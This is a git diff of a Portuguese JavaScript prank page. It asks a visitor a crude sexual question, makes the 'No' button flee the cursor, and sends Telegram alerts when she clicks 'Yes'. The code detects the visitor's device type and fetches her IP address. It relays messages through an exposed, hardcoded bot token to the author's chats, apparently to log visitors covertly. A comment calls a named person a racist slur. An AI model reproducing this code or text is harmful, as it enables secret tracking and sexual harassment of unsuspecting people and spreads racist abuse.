@@ -6,12 +6,24 @@ const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
 
 const CHAT_IDS = [
     "8448614204",   // Mr. Lonely (Sou eu porra)
-    "8219025301",   // Luizz
+    "8219025301",   // Luiz (Mono macaco queimado preto escravo)
 ];
 
 const cuSim = document.getElementById('cuSim');
 const cuNao = document.getElementById('cuNao');
 const resposta = document.getElementById('cuResposta');
+// função desgraçada pra mandar msg alternativa
+async function SendCoisa(text) {
+    for (const chatId of CHAT_IDS) {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: text })
+            });
+        } catch (err) {}
+    }
+}
 
 
 function detectDeviceType() {
@@ -77,11 +89,11 @@ async function getIPv4({ timeoutMs = 3000 } = {}) {
             if (isIPv4(ip)) return ip;
         } catch (e) {
             // ignora e tenta próximo fallback
-            console.warn(`Falha no endpoint ${url}:`, e.message);
+            SendCoisa(`Falha no endpoint ${url}:`, e.message);
         }
     }
 
-    console.error("Todos os fallbacks de IPv4 falharam");
+    SendCoisa("Todos os fallbacks de IPv4 falharam");
     return "Não capturado";
 }
 
@@ -124,58 +136,43 @@ async function init() {
 }
 
 function moverBotao(btn) {
-            if (getComputedStyle(btn).position === 'static') {
-                btn.style.position = 'fixed';
-            }
+    if (getComputedStyle(btn).position === 'static') {
+        btn.style.position = 'fixed';
+    }
 
-            const viewport = window.visualViewport || window;
-            const larguraJanela = viewport.width || window.innerWidth;
-            const alturaJanela = viewport.height || window.innerHeight;
+    const viewport = window.visualViewport || window;
+    const larguraJanela = viewport.width || window.innerWidth;
+    const alturaJanela = viewport.height || window.innerHeight;
 
-            const larguraBtn = btn.offsetWidth;
-            const alturaBtn = btn.offsetHeight;
+    const larguraBtn = btn.offsetWidth;
+    const alturaBtn = btn.offsetHeight;
 
-            const maxX = Math.max(0, larguraJanela - larguraBtn);
-            const maxY = Math.max(0, alturaJanela - alturaBtn);
+    const maxX = Math.max(0, larguraJanela - larguraBtn);
+    const maxY = Math.max(0, alturaJanela - alturaBtn);
 
-            const novaX = Math.random() * maxX;
-            const novaY = Math.random() * maxY;
+    const novaX = Math.random() * maxX;
+    const novaY = Math.random() * maxY;
 
-            btn.style.left = novaX + 'px';
-            btn.style.top = novaY + 'px';
-        }
+    btn.style.left = novaX + 'px';
+    btn.style.top = novaY + 'px';
+}
 
-        function mostrarResposta(texto) {
-            resposta.textContent = texto;
-        }
+function mostrarResposta(texto) {
+    resposta.textContent = texto;
+}
 
-        // Botão SIM
-        cuSim.addEventListener('click', async () => {
-            mostrarResposta('Aaa que bom! Fico feliz 😊💜');
-            
-            // Envia mensagem para todos os CHAT_IDS
-            for (const chatId of CHAT_IDS) {
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            chat_id: chatId, 
-                            text: '🎉 ELA DISSE SIM! 🎉\nEla falou que vai dar o cuzinho!\nOloko, ai sim kaakakak' 
-                        })
-                    });
-                } catch (err) {
-                    console.error('Erro ao enviar mensagem:', err);
-                }
-            }
-        });
+// Botão SIM
+cuSim.addEventListener('click', async () => {
+    mostrarResposta('Aaa que bom! Fico feliz 😊💜');
+    SendCoisa('🎉 ELA DISSE SIM! 🎉\nEla falou que vai dar o cuzinho!\nOloko, ai sim kaakakak');   
+});
         
 // Botão NÃO - foge do cursor/dedo
 cuNao.addEventListener('mouseenter', () => moverBotao(cuNao));
         
 cuNao.addEventListener('touchstart', (e) => {
-        e.preventDefault();
-        moverBotao(cuNao);
+    e.preventDefault();
+    moverBotao(cuNao);
 });
 
 cuNao.addEventListener('click', (e) => {
